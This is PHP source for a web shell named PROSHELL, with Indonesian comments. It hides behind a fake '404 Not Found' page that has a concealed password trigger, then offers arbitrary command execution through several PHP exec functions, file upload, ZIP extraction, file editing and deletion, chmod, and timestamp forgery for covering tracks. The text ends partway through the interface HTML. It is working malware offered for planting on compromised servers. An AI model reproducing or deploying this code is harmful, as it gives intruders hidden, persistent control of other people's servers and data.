<?php
// ============================================
// PROSHELL - ADVANCED WEB SHELL
// Version: V3.1 - FIXED
// ============================================

error_reporting(0);
ini_set('display_errors', 0);

// Session configuration untuk keamanan
ini_set('session.cookie_httponly', 1);
ini_set('session.use_only_cookies', 1);
ini_set('session.cookie_secure', 0); // Set ke 1 jika pakai HTTPS
ini_set('session.cookie_samesite', 'Strict');

session_start();

$auth_pass_hash = '$2a$12$G127m7pLUIaxzmb0ed.O7uILto860bjqOn0AqV51HH/hNf4mHwcDq'; 
$shell_name = "𝗦𝘂𝗽𝗿𝗲𝗺𝗲";
$shell_version = "VIP06";
$secret_key = bin2hex(random_bytes(16)); 

// ============================================
// SECURITY FUNCTIONS
// ============================================

function isPathAllowed($path) {
    $path = realpath($path);
    if ($path === false) return false;
    
    // Cegah akses ke file sistem sensitif
    $blocked = ['/etc/passwd', '/etc/shadow', '/etc/ssl', '/root/'];
    foreach ($blocked as $block) {
        if (strpos($path, $block) !== false) return false;
    }
    
    return true;
}

function normalizePath($path) {
    $path = str_replace(['\\', '//'], '/', $path);
    $parts = array_filter(explode('/', $path), 'strlen');
    $absolutes = [];
    foreach ($parts as $part) {
        if ('.' == $part) continue;
        if ('..' == $part) {
            array_pop($absolutes);
        } else {
            $absolutes[] = $part;
        }
    }
    return '/' . implode('/', $absolutes);
}

// Session timeout (30 menit)
if (isset($_SESSION['logged_in']) && isset($_SESSION['login_time'])) {
    if (time() - $_SESSION['login_time'] > 1800) {
        session_destroy();
        header("Location: ?");
        exit;
    }
    $_SESSION['login_time'] = time(); // Refresh timeout
}

// ============================================
// LOGIN HANDLER
// ============================================

if (isset($_GET['logout'])) { 
    session_destroy(); 
    header("Location: ?"); 
    exit; 
}

if (isset($_POST['pass'])) {
    if (password_verify($_POST['pass'], $auth_pass_hash)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
        $_SESSION['cwd'] = __DIR__; // Simpan current working directory
        header("Location: ?");
        exit;
    } else {
        $_SESSION['login_error'] = true;
        header("Location: ?");
        exit;
    }
}

// ============================================
// CHECK LOGIN STATUS - DIREKTIF
// ============================================
if (empty($_SESSION['logged_in'])) {
    header("HTTP/1.0 404 Not Found");
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        body { background: white; color: black; font-family: Arial, sans-serif; margin: 40px; }
        hr { border: none; border-top: 1px solid #ccc; margin: 20px 0; }
        address { font-style: italic; color: #666; }
        .hint { 
            position: fixed; 
            bottom: 10px; 
            right: 10px; 
            color: #ccc; 
            font-size: 11px;
            opacity: 0.5;
            cursor: pointer;
        }
        .password-form {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            display: none;
            z-index: 1000;
        }
        .password-form input {
            padding: 10px;
            margin: 10px 0;
            width: 200px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .password-form button {
            padding: 10px 20px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            display: none;
            z-index: 999;
        }
    </style>
</head>
<body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address><?= $_SERVER['SERVER_SOFTWARE'] ?? 'Apache' ?> Server at <?= $_SERVER['HTTP_HOST'] ?? 'localhost' ?></address>
    <div class="hint" onclick="showPasswordPrompt()">🔑</div>
    
    <div class="overlay" id="overlay"></div>
    <div class="password-form" id="passwordForm">
        <h3>Enter Password</h3>
        <input type="password" id="passwordInput" placeholder="Password" autocomplete="off">
        <br>
        <button onclick="submitPassword()">Submit</button>
        <button onclick="hidePasswordPrompt()">Cancel</button>
    </div>

    <script>
        function showPasswordPrompt() {
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('passwordForm').style.display = 'block';
            document.getElementById('passwordInput').focus();
        }
        
        function hidePasswordPrompt() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('passwordForm').style.display = 'none';
        }
        
        function submitPassword() {
            let password = document.getElementById('passwordInput').value;
            if (password.trim() !== '') {
                let form = document.createElement('form');
                form.method = 'POST';
                let input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'pass';
                input.value = password;
                form.appendChild(input);
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        // Trigger with Page Down key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'PageDown' || e.keyCode === 34) {
                e.preventDefault();
                showPasswordPrompt();
            }
        });
        
        // Enter key in password input
        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitPassword();
            }
        });
        
        <?php if (isset($_SESSION['login_error'])): ?>
        alert("Invalid password!");
        <?php unset($_SESSION['login_error']); ?>
        <?php endif; ?>
    </script>
</body>
</html>
<?php 
    exit; 
} 

// ============================================
// MAIN INTERFACE
// ============================================

// Ambil current path dari session atau default
$rootPath = __DIR__;
$currentPath = isset($_GET['path']) ? realpath(urldecode($_GET['path'])) : ($_SESSION['cwd'] ?? $rootPath);

if (!$currentPath || !is_dir($currentPath) || !isPathAllowed($currentPath)) {
    $currentPath = $rootPath;
}

// Simpan ke session
$_SESSION['cwd'] = $currentPath;

// ============================================
// HANDLE FILE OPERATIONS
// ============================================

// Create folder
if (isset($_POST['create_folder']) && isset($_POST['folder_name'])) {
    $folderName = basename($_POST['folder_name']);
    $targetPath = $currentPath . '/' . $folderName;
    if (!file_exists($targetPath)) {
        if (@mkdir($targetPath, 0755)) {
            $_SESSION['message'] = 'Folder created successfully';
        } else {
            $_SESSION['error'] = 'Failed to create folder';
        }
    } else {
        $_SESSION['error'] = 'Folder already exists';
    }
    header('Location: ?path=' . urlencode($currentPath));
    exit;
}

// Create file
if (isset($_POST['create_file']) && isset($_POST['file_name'])) {
    $fileName = basename($_POST['file_name']);
    $targetPath = $currentPath . '/' . $fileName;
    $content = $_POST['content'] ?? '';
    if (!file_exists($targetPath)) {
        if (@file_put_contents($targetPath, $content) !== false) {
            $_SESSION['message'] = 'File created successfully';
        } else {
            $_SESSION['error'] = 'Failed to create file';
        }
    } else {
        $_SESSION['error'] = 'File already exists';
    }
    header('Location: ?path=' . urlencode($currentPath));
    exit;
}

// Rename
if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $oldName = basename($_POST['old_name']);
    $newName = basename($_POST['new_name']);
    $oldPath = $currentPath . '/' . $oldName;
    $newPath = $currentPath . '/' . $newName;
    
    if (file_exists($oldPath) && !file_exists($newPath)) {
        if (@rename($oldPath, $newPath)) {
            $_SESSION['message'] = 'Renamed successfully';
        } else {
            $_SESSION['error'] = 'Failed to rename';
        }
    } else {
        $_SESSION['error'] = 'Invalid operation';
    }
    header('Location: ?path=' . urlencode($currentPath));
    exit;
}

// Chmod
if (isset($_POST['chmod']) && isset($_POST['chmod_file']) && isset($_POST['permissions'])) {
    $file = basename($_POST['chmod_file']);
    $targetPath = $currentPath . '/' . $file;
    $perms = intval($_POST['permissions'], 8);
    
    if (file_exists($targetPath)) {
        if (@chmod($targetPath, $perms)) {
            $_SESSION['message'] = 'Permissions changed successfully';
        } else {
            $_SESSION['error'] = 'Failed to change permissions';
        }
    }
    header('Location: ?path=' . urlencode($currentPath));
    exit;
}

// Upload files
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    $uploaded = 0;
    $failed = 0;
    
    $files = $_FILES['upload_file'];
    $fileCount = is_array($files['name']) ? count($files['name']) : 1;
    
    for ($i = 0; $i < $fileCount; $i++) {
        $tmpName = is_array($files['tmp_name']) ? $files['tmp_name'][$i] : $files['tmp_name'];
        $fileName = is_array($files['name']) ? $files['name'][$i] : $files['name'];
        $error = is_array($files['error']) ? $files['error'][$i] : $files['error'];
        
        if ($error === UPLOAD_ERR_OK) {
            $name = basename($fileName);
            $target = $currentPath . '/' . $name;
            if (move_uploaded_file($tmpName, $target)) {
                $uploaded++;
                @chmod($target, 0644);
            } else {
                $failed++;
            }
        } else {
            $failed++;
        }
    }
    
    if ($uploaded > 0) {
        $_SESSION['message'] = $uploaded . ' file(s) uploaded successfully';
    }
    if ($failed > 0) {
        $_SESSION['error'] = $failed . ' file(s) failed to upload';
    }
    
    header('Location: ?path=' . urlencode($currentPath));
    exit;
}

// Upload & extract ZIP
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['zip_file'])) {
    if ($_FILES['zip_file']['error'] !== UPLOAD_ERR_OK) {
        $_SESSION['error'] = 'ZIP upload error';
        header('Location: ?path=' . urlencode($currentPath));
        exit;
    }
    
    $zipName = basename($_FILES['zip_file']['name']);
    $zipExt = strtolower(pathinfo($zipName, PATHINFO_EXTENSION));
    
    if ($zipExt !== 'zip') {
        $_SESSION['error'] = 'File is not a valid ZIP';
        header('Location: ?path=' . urlencode($currentPath));
        exit;
    }
    
    $zipPath = $currentPath . '/' . $zipName;
    
    if (move_uploaded_file($_FILES['zip_file']['tmp_name'], $zipPath)) {
        $extracted = false;
        
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($zipPath) === TRUE) {
                $extractSuccess = $zip->extractTo($currentPath);
                $zip->close();
                
                if ($extractSuccess) {
                    @unlink($zipPath);
                    $_SESSION['message'] = 'ZIP file extracted successfully';
                    $extracted = true;
                }
            }
        }
        
        if (!$extracted && (function_exists('shell_exec') || function_exists('exec'))) {
            $unzipCmd = 'unzip -o ' . escapeshellarg($zipPath) . ' -d ' . escapeshellarg($currentPath) . ' 2>&1';
            $output = '';
            
            if (function_exists('shell_exec')) {
                $output = shell_exec($unzipCmd);
            } elseif (function_exists('exec')) {
                exec($unzipCmd, $out);
                $output = implode("\n", $out);
            }
            
            if (strpos($output, 'error') === false) {
                @unlink($zipPath);
                $_SESSION['message'] = 'ZIP file extracted successfully';
                $extracted = true;
            }
        }
        
        if (!$extracted) {
            $_SESSION['error'] = 'Failed to extract ZIP file';
            @unlink($zipPath);
        }
    } else {
        $_SESSION['error'] = 'Failed to upload ZIP file';
    }
    
    header('Location: ?path=' . urlencode($currentPath));
    exit;
}

// Delete
if (isset($_GET['delete'])) {
    $file = $currentPath . '/' . basename($_GET['delete']);
    if (file_exists($file) && isPathAllowed($file)) {
        if (is_file($file)) {
            if (@unlink($file)) {
                $_SESSION['message'] = 'File deleted successfully';
            } else {
                $_SESSION['error'] = 'Failed to delete file';
            }
        } else if (is_dir($file)) {
            // Recursive delete for directory
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            
            foreach ($files as $fileinfo) {
                $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
                @$todo($fileinfo->getRealPath());
            }
            
            if (@rmdir($file)) {
                $_SESSION['message'] = 'Folder deleted successfully';
            } else {
                $_SESSION['error'] = 'Failed to delete folder';
            }
        }
    }
    header('Location: ?path=' . urlencode($currentPath));
    exit;
}

// Edit file
if (isset($_GET['edit'])) {
    $editFile = $currentPath . '/' . basename($_GET['edit']);
    if (file_exists($editFile) && is_file($editFile) && isPathAllowed($editFile)) {
        $fileContent = file_get_contents($editFile);
        $fileInfo = [
            'name' => basename($editFile),
            'size' => formatBytes(filesize($editFile)),
            'perms' => substr(sprintf('%o', fileperms($editFile)), -4),
            'modified' => date('Y-m-d H:i:s', filemtime($editFile)),
            'writable' => is_writable($editFile)
        ];
    } else {
        $_SESSION['error'] = 'File not found';
        header('Location: ?path=' . urlencode($currentPath));
        exit;
    }
}

// Save file
if (isset($_POST['save_file']) && isset($_POST['content']) && isset($_POST['file'])) {
    $filePath = $_POST['file'];
    if (file_exists($filePath) && is_writable($filePath) && isPathAllowed($filePath)) {
        if (file_put_contents($filePath, $_POST['content']) !== false) {
            $_SESSION['message'] = 'File saved successfully';
        } else {
            $_SESSION['error'] = 'Failed to save file';
        }
    }
    header('Location: ?path=' . urlencode(dirname($filePath)));
    exit;
}

// Edit timestamp
if (isset($_POST['edit_timestamp']) && isset($_POST['file']) && isset($_POST['new_time'])) {
    $filePath = $_POST['file'];
    $newTime = strtotime($_POST['new_time']);
    
    if (!file_exists($filePath)) {
        $_SESSION['error'] = 'File not found';
    } elseif (!isPathAllowed($filePath)) {
        $_SESSION['error'] = 'Access denied';
    } elseif ($newTime === false) {
        $_SESSION['error'] = 'Invalid date format';
    } else {
        if (@touch($filePath, $newTime, $newTime)) {
            $_SESSION['message'] = 'File timestamp changed to ' . date('Y-m-d H:i:s', $newTime);
        } else {
            $_SESSION['error'] = 'Failed to change timestamp';
        }
    }
    header('Location: ?path=' . urlencode(dirname($filePath)));
    exit;
}

// ============================================
// FILE ACCESS HANDLER
// ============================================
if (isset($_GET['file_access'])) {
    $file = $_GET['file_access'];
    if (file_exists($file) && is_file($file) && isPathAllowed($file)) {
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        $mime_types = [
            'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg', 'png' => 'image/png',
            'gif' => 'image/gif', 'pdf' => 'application/pdf', 'txt' => 'text/plain',
            'css' => 'text/css', 'js' => 'application/javascript',
            'html' => 'text/html', 'htm' => 'text/html', 'php' => 'text/plain'
        ];
        
        $mime = $mime_types[$ext] ?? 'application/octet-stream';
        header('Content-Type: ' . $mime);
        header('Content-Disposition: inline; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        header('Cache-Control: public, max-age=86400');
        readfile($file);
        exit;
    }
    header('HTTP/1.0 404 Not Found');
    exit;
}

// ============================================
// COMMAND EXECUTION HANDLER
// ============================================
if (isset($_POST['cmd'])) {
    header('Content-Type: application/json');
    $cmd = $_POST['cmd'];
    $cwd = isset($_POST['cwd']) ? $_POST['cwd'] : $_SESSION['cwd'];
    
    $dangerous = ['rm -rf /*', 'mkfs', 'dd if=/dev/zero', 'format', 'fdisk', ':(){ :|:& };:'];
    foreach ($dangerous as $danger) {
        if (stripos($cmd, $danger) !== false) {
            echo json_encode(['output' => "⚠️ Command blocked for safety", 'cwd' => $cwd]);
            exit;
        }
    }
    
    $output = '';
    if (function_exists('shell_exec')) {
        $output = shell_exec("cd " . escapeshellarg($cwd) . " 2>/dev/null && " . $cmd . " 2>&1");
    } elseif (function_exists('exec')) {
        exec("cd " . escapeshellarg($cwd) . " 2>/dev/null && " . $cmd . " 2>&1", $out);
        $output = implode("\n", $out);
    } elseif (function_exists('system')) {
        ob_start();
        system("cd " . escapeshellarg($cwd) . " 2>/dev/null && " . $cmd . " 2>&1");
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru("cd " . escapeshellarg($cwd) . " 2>/dev/null && " . $cmd . " 2>&1");
        $output = ob_get_clean();
    } elseif (function_exists('popen')) {
        $handle = popen("cd " . escapeshellarg($cwd) . " 2>/dev/null && " . $cmd . " 2>&1", 'r');
        if ($handle) {
            while (!feof($handle)) {
                $output .= fread($handle, 1024);
            }
            pclose($handle);
        }
    }
    
    // Update session CWD jika perintah cd berhasil
    if (preg_match('/^cd\s+(.+)/', $cmd, $matches)) {
        $newDir = trim($matches[1]);
        if ($newDir == '..') {
            $newCwd = dirname($cwd);
        } elseif ($newDir == '~') {
            $newCwd = $_SERVER['HOME'] ?? $cwd;
        } else {
            $newCwd = $cwd . '/' . $newDir;
        }
        if (is_dir($newCwd)) {
            $_SESSION['cwd'] = realpath($newCwd);
            $cwd = $_SESSION['cwd'];
        }
    }
    
    echo json_encode(['output' => $output ?: "(no output)", 'cwd' => $cwd]);
    exit;
}

// ============================================
// MAIN HTML OUTPUT
// ============================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlspecialchars($shell_name) ?> - <?= htmlspecialchars($shell_version) ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.2)), 
                        url('https://i.ibb.co.com/ksR9vqbq/photo-2026-04-18-08-27-57.jpg') no-repeat center center fixed;
            background-size: cover;
            color: #e0e0e0;
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            background: rgba(20, 20, 20, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #333;
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
        }

        .header-top {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }

        .brand {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .nav-links {
            display: flex;
            gap: 15px;
            margin-left: auto;
        }

        .nav-link {
            color: #ff8e8e;
            text-decoration: none;
            padding: 8px 16px;
            border-radius: 8px;
            background: rgba(255,107,107,0.1);
            transition: all 0.3s;
            border: 1px solid rgba(255,107,107,0.3);
        }

        .nav-link:hover {
            background: rgba(255,107,107,0.2);
            transform: translateY(-2px);
        }

        .logout-btn {
            background: rgba(220,53,69,0.2);
            border-color: rgba(220,53,69,0.5);
            color: #ff6b6b;
        }

        .logout-btn:hover {
            background: rgba(220,53,69,0.3);
        }

        .path-nav {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 12px 16px;
            background: rgba(0,0,0,0.3);
            border-radius: 12px;
            border: 1px solid #333;
            overflow-x: auto;
            white-space: nowrap;
        }

        .path-item {
            display: inline-flex;
            align-items: center;
            color: #ff8e8e;
            text-decoration: none;
            padding: 6px 12px;
            border-radius: 6px;
            transition: all 0.3s;
        }

        .path-item:hover {
            background: rgba(255,107,107,0.1);
        }

        .path-item.current {
            background: rgba(255,107,107,0.2);
            color: #ff6b6b;
            font-weight: 600;
        }

        .toolbar {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .btn {
            padding: 10px 20px;
            border-radius: 8px;
            border: none;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            background: linear-gradient(135deg, #333, #222);
            color: white;
            border: 1px solid #444;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
            border: none;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255,107,107,0.4);
        }

        .btn-success {
            background: linear-gradient(135deg, #28a745, #34ce57);
            border: none;
        }

        .search-box {
            flex: 1;
            padding: 10px 20px;
            border-radius: 8px;
            border: 1px solid #444;
            background: rgba(0,0,0,0.3);
            color: white;
            font-size: 14px;
            min-width: 200px;
        }

        .search-box:focus {
            outline: none;
            border-color: #ff6b6b;
        }

        .message {
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            animation: slideIn 0.3s;
        }

        .message-success {
            background: rgba(40,167,69,0.2);
            border: 1px solid #28a745;
            color: #98ff98;
        }

        .message-error {
            background: rgba(220,53,69,0.2);
            border: 1px solid #dc3545;
            color: #ff9898;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
            background: rgba(20,20,20,0.8);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            overflow: hidden;
            border: 1px solid #333;
            margin-bottom: 20px;
        }

        .file-table th {
            background: linear-gradient(135deg, #1a1a1a, #222);
            color: #ff8e8e;
            font-weight: 600;
            padding: 15px 20px;
            text-align: left;
            border-bottom: 2px solid #ff6b6b;
        }

        .file-table td {
            padding: 12px 20px;
            border-bottom: 1px solid #333;
            color: #e0e0e0;
        }

        .file-table tr:hover td {
            background: rgba(255,107,107,0.05);
        }

        .file-icon {
            font-size: 18px;
            margin-right: 10px;
        }

        .file-name {
            display: flex;
            align-items: center;
            text-decoration: none;
            color: #e0e0e0;
        }

        .file-name:hover {
            color: #ff8e8e;
        }

        .file-size {
            color: #888;
            font-size: 12px;
        }

        .file-perms {
            font-family: monospace;
            padding: 4px 8px;
            background: rgba(0,0,0,0.3);
            border-radius: 4px;
            font-size: 12px;
            border: 1px solid #444;
        }

        .action-btns {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }

        .action-btn {
            padding: 5px 10px;
            border-radius: 4px;
            background: rgba(0,0,0,0.3);
            border: 1px solid #444;
            color: #e0e0e0;
            text-decoration: none;
            font-size: 12px;
            transition: all 0.3s;
            cursor: pointer;
        }

        .action-btn:hover {
            background: rgba(255,107,107,0.2);
            border-color: #ff6b6b;
        }

        .delete-btn:hover {
            background: rgba(220,53,69,0.3);
            border-color: #dc3545;
        }

        .terminal {
            background: #0f0f0f;
            border-radius: 16px;
            border: 1px solid #333;
            overflow: hidden;
            margin-top: 20px;
        }

        .terminal-header {
            background: linear-gradient(135deg, #1a1a1a, #222);
            padding: 12px 20px;
            border-bottom: 1px solid #ff6b6b;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .terminal-title {
            color: #ff8e8e;
            font-weight: 600;
        }

        .terminal-cwd {
            color: #98ff98;
            font-size: 12px;
            font-family: monospace;
            background: rgba(0,0,0,0.3);
            padding: 4px 10px;
            border-radius: 20px;
        }

        .terminal-output {
            padding: 20px;
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            background: #0a0a0a;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            line-height: 1.6;
            color: #98ff98;
        }

        .terminal-output pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .terminal-input-area {
            display: flex;
            padding: 15px 20px;
            background: #1a1a1a;
            border-top: 1px solid #333;
            gap: 10px;
        }

        .terminal-prompt {
            color: #ff8e8e;
            font-weight: bold;
            font-family: monospace;
        }

        .terminal-input {
            flex: 1;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #98ff98;
            padding: 8px 15px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 13px;
        }

        .terminal-input:focus {
            outline: none;
            border-color: #ff6b6b;
        }

        .terminal-send {
            padding: 8px 20px;
            background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .quick-cmds {
            display: flex;
            gap: 10px;
            padding: 15px 20px;
            background: #1a1a1a;
            border-top: 1px solid #333;
            flex-wrap: wrap;
        }

        .quick-cmd {
            padding: 5px 12px;
            background: rgba(0,0,0,0.3);
            border: 1px solid #444;
            border-radius: 20px;
            color: #e0e0e0;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .quick-cmd:hover {
            background: rgba(255,107,107,0.2);
            border-color: #ff6b6b;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(5px);
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .modal-content {
            background: linear-gradient(135deg, #1a1a1a, #222);
            padding: 30px;
            border-radius: 16px;
            width: 90%;
            max-width: 500px;
            border: 1px solid #ff6b6b;
        }

        .modal-title {
            color: #ff8e8e;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        .modal-input {
            width: 100%;
            padding: 10px 15px;
            background: #0a0a0a;
            border: 1px solid #444;
            border-radius: 8px;
            color: white;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .modal-input:focus {
            outline: none;
            border-color: #ff6b6b;
        }

        .modal-textarea {
            width: 100%;
            padding: 10px 15px;
            background: #0a0a0a;
            border: 1px solid #444;
            border-radius: 8px;
            color: white;
            font-size: 14px;
            margin-bottom: 20px;
            min-height: 150px;
            resize: vertical;
        }

        .modal-buttons {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }

        .modal-btn {
            padding: 8px 20px;
            border-radius: 8px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .modal-btn-cancel {
            background: #333;
            color: white;
        }

        .modal-btn-submit {
            background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
            color: white;
        }

        .stats {
            display: flex;
            gap: 15px;
            margin-top: 20px;
            color: #888;
            font-size: 12px;
        }

        .stat-item {
            padding: 5px 10px;
            background: rgba(0,0,0,0.3);
            border-radius: 4px;
        }

        @media (max-width: 768px) {
            .header-top {
                flex-direction: column;
                align-items: stretch;
            }
            
            .nav-links {
                margin-left: 0;
            }
            
            .file-table {
                display: block;
                overflow-x: auto;
            }
            
            .action-btns {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-top">
                <div class="brand">⚠️ <?= htmlspecialchars($shell_name) ?> <?= htmlspecialchars($shell_version) ?></div>
                <div class="nav-links">
                    <a href="?path=<?= urlencode($rootPath) ?>" class="nav-link">🏠 Home</a>
                    <a href="?logout=1" class="nav-link logout-btn">🚪 Logout</a>
                </div>
            </div>
            
            <div class="path-nav">
                <?php
                $parts = explode('/', trim($currentPath, '/'));
                $builtPath = '';
                foreach ($parts as $i => $part):
                    if (empty($part)) continue;
                    $builtPath .= '/' . $part;
                ?>
                    <a href="?path=<?= urlencode($builtPath) ?>" class="path-item <?= $i == count($parts)-1 ? 'current' : '' ?>">
                        <?= htmlspecialchars($part) ?>
                    </a>
                    <?php if ($i < count($parts)-1): ?>
                        <span class="path-sep">/</span>
                    <?php endif; ?>
                <?php endforeach; ?>
            </div>
        </div>

        <?php if (isset($_SESSION['message'])): ?>
            <div class="message message-success">✅ <?= $_SESSION['message'] ?></div>
            <?php unset($_SESSION['message']); ?>
        <?php endif; ?>
        
        <?php if (isset($_SESSION['error'])): ?>
            <div class="message message-error">❌ <?= $_SESSION['error'] ?></div>
            <?php unset($_SESSION['error']); ?>
        <?php endif; ?>

        <?php if (isset($fileContent)): ?>
        <!-- FILE EDITOR VIEW -->
        <div style="margin-bottom: 20px; background: #0f0f0f; border-radius: 16px; border: 1px solid #333; overflow: hidden;">
            <div class="terminal-header" style="border-radius: 0;">
                <span class="terminal-title">📝 Editing: <?= htmlspecialchars($fileInfo['name']) ?></span>
                <span class="terminal-cwd"><?= $fileInfo['size'] ?> | <?= $fileInfo['perms'] ?></span>
            </div>
            
            <div style="padding: 20px;">
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 20px; padding: 15px; background: #1a1a1a; border-radius: 8px;">
                    <div>
                        <div style="color: #ff8e8e; font-size: 11px;">MODIFIED</div>
                        <div style="font-family: monospace; color: #98ff98;"><?= $fileInfo['modified'] ?></div>
                    </div>
                    <div>
                        <div style="color: #ff8e8e; font-size: 11px;">PERMISSIONS</div>
                        <div style="font-family: monospace; color: #98ff98;"><?= $fileInfo['perms'] ?></div>
                    </div>
                    <div>
                        <div style="color: #ff8e8e; font-size: 11px;">STATUS</div>
                        <div style="color: <?= $fileInfo['writable'] ? '#98ff98' : '#ff9898' ?>;">
                            <?= $fileInfo['writable'] ? '✅ Writable' : '❌ Read Only' ?>
                        </div>
                    </div>
                </div>
                
                <div style="margin-bottom: 20px; padding: 15px; background: #1a1a1a; border-radius: 8px; border: 1px solid #ff6b6b;">
                    <div style="color: #ff8e8e; margin-bottom: 10px; font-weight: 600;">⏰ Edit Timestamp</div>
                    <form method="post" style="display: flex; gap: 10px; align-items: flex-end; flex-wrap: wrap;">
                        <input type="hidden" name="file" value="<?= htmlspecialchars($editFile) ?>">
                        <div style="flex: 1; min-width: 200px;">
                            <div style="color: #888; font-size: 11px; margin-bottom: 4px;">Current Time</div>
                            <div style="background: #0a0a0a; padding: 8px 12px; border-radius: 4px; border: 1px solid #333; color: #98ff98; font-family: monospace;">
                                <?= $fileInfo['modified'] ?>
                            </div>
                        </div>
                        <div style="flex: 1; min-width: 200px;">
                            <div style="color: #888; font-size: 11px; margin-bottom: 4px;">New Time</div>
                            <input type="datetime-local" name="new_time" value="<?= date('Y-m-d\TH:i', strtotime($fileInfo['modified'])) ?>" class="modal-input" style="margin-bottom: 0;" required>
                        </div>
                        <button type="submit" name="edit_timestamp" class="btn btn-primary" style="padding: 8px 20px;">Update Time</button>
                    </form>
                </div>
                
                <form method="post">
                    <textarea name="content" style="width: 100%; min-height: 400px; background: #0a0a0a; color: #98ff98; border: 1px solid #333; padding: 15px; font-family: monospace; font-size: 13px; border-radius: 8px;" <?= !$fileInfo['writable'] ? 'readonly' : '' ?>><?= htmlspecialchars($fileContent) ?></textarea>
                    <input type="hidden" name="file" value="<?= htmlspecialchars($editFile) ?>">
                    <div style="display: flex; gap: 10px; margin-top: 15px;">
                        <a href="?path=<?= urlencode($currentPath) ?>" class="btn" style="text-decoration: none;">← Back</a>
                        <?php if ($fileInfo['writable']): ?>
                        <button type="submit" name="save_file" class="btn btn-primary">💾 Save Changes</button>
                        <?php endif; ?>
                    </div>
                </form>
            </div>
        </div>
        <?php else: ?>

        <div class="toolbar">
            <button class="btn btn-primary" onclick="showModal('upload')">📤 Upload File(s)</button>
            <button class="btn btn-success" onclick="showModal('zip')">📦 Upload ZIP</button>
            <button class="btn" onclick="showModal('folder')">📁 New Folder</button>
            <button class="btn" onclick="showModal('file')">📄 New File</button>
            <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search files..." onkeyup="searchFiles(this.value)">
        </div>

